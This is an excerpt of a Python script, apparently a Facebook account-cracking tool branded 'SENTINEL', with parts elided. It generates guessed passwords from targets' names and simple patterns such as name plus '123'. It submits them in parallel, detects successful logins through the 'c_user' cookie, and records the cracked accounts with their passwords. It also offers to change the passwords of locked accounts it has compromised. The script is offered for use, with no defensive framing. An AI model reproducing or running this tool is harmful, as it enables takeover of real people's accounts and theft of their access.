# code by SENTINEL
# my facebook ( https://www.facebook.com/SEN TI NEL)
...
def linex():
	os.system('echo  "\n ======================================\n" | lolcat -a -d 2 -s 50')
def logo():
	os.system('echo "\n  ▒▄█▀▀█░▐█▀▀▒██▄░▒█▌▒█▀█▀█▐██▒██▄░▒█▌░▐█▀▀▒██░░░\n  ▒▀▀█▄▄░▐█▀▀▒▐█▒█▒█░░░▒█░░░█▌▒▐█▒█▒█░░▐█▀▀▒██░░░\n  ▒█▄▄█▀░▐█▄▄▒██░▒██▌░▒▄█▄░▐██▒██░▒██▌░▐█▄▄▒██▄▄█\n    ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▒ ░░  ░      ░\n    ░   ▒░  ░ ░ ░ ░ ░ ▒ ░░      ░\n        ░  ░  ░ ░     ░         ░\n            ░\n  \n    ╔═════════════════════════════════════════╗\n    ║ TOOL NAME: {FILE CLONING}               ║\n    ║ AUTHOR   : SENTINEL × CHISOM 😎         ║\n    ║ GITHUB   : SENTINEL101                  ║\n    ╚═════════════════════════════════════════╝" | lolcat -a -d 2 -s 50')
...
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By SENTINEL Usercrack...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        ...
        if cek_cp =="":
            print(f"\n [{M}!{N}] Can't be empty");hasil(ok,cp)
        elif cek_cp in["Y","y"]:
            jalan(f" {N}[{M}!{N}] Use Airplane mode First");time.sleep(5)
            ww=input(f"\n {N}[{K}?{N}] Change password when {BM}TAP YES{N} [{H}Y{N}/{M}t{N}]: ")
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] Password example : {H}SENTINEL123{N}")
                pwBar=input(f" {N}[{K}?{N}] Enter new password : {H}")
                #print("\n")
                if len(pwBar) <= 8:
                    print('\n %s[%s×%s] Password minimum 8 characters'%(N,M,N))
                else:
                    pwBaru.append(pwBar)
            for memek in cp:
                ...
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[SENTINEL-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[SENTINEL-CP] ", ""), titid[1])
...
class __chigoue__:
    ...
    def chi(self, id):
        ...
        if crot in[""]:
            print(f" {N}[{M}×{N}] Can't be empty");__chigoue__().chi(id)
        elif crot in["Y","y"]:
            Apk.append("y")
        elif crot in["T","t"]:
            Apk.append("t")
...
# PROCESS CRACK METHOD 3 in 1
    def __method__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[SENTINEL]","\x1b[1;92m[SENTINEL]","\x1b[1;92m[SENTINEL]","\x1b[1;92m[SENTINEL]","\x1b[1;92m[SENTINEL]","\x1b[1;92m[SENTINEL]","\x1b[1;92m[SENTINEL]"])
        ...
        try:
            for pw in pasw:
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        wrt = '[SENTINEL-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
            ...
            loop+=1
             ...
             self.__method__(cebok, user, pasw)
    ...
    def kombinasi_pw(self,url):
        ...
        if pw in[""]:
            print(f" {N}[{M}!{N}] Can't be empty");self.kombinasi_pw(url)
        elif pw in["1","01"]:
                ...
                for yntkts in self.id:
                   try:
                       ...
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           ...
                           pwx = [name, xz[0]+xz[1], xz[0]+"123"]
                       kirim.submit(self.__method__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)
        elif pw in["2","02"]:
            print('%s════════════════════════════════════════\n[%s+%s] OK : results/OK-%s-%s-%s.txt'%(H,H,H,ha, op, ta))
            ...
            #print(" %s[%s!%s] The more password combinations, the longer the crack process!"%(N,M,N))
            print("%s[%s!%s] Use %sComa%s For Choice Password"%(H,H,H,H,H))
            print("%s[%s!%s] Example : %s786786,sentinel,nigeria,chisom,123456%s"%(H,H,H,H,H))
